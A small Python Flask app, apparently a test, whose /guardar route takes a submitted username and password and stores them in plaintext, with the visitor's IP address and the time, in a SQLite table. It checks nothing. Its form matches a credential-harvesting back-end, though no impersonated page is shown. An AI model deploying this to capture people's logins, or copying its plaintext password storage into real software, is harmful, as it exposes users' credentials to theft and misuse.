from flask import Flask, render_template, request, redirect
import sqlite3
from datetime import datetime

app = Flask(__name__)

def guardar_en_db(usuario, clave, ip):
    hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    conn = sqlite3.connect('usuarios.db')
    c = conn.cursor()
    c.execute("INSERT INTO logins (usuario, clave, ip, hora) VALUES (?, ?, ?, ?)", (usuario, clave, ip, hora))
    conn.commit()
    conn.close()

@app.route('/')
def index():
    return render_template('prueba.html')

@app.route('/guardar', methods=['POST'])
def guardar():
    usuario = request.form['usuario']
    clave = request.form['clave']
    ip = request.remote_addr
    guardar_en_db(usuario, clave, ip)
    return "Datos guardados correctamente"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
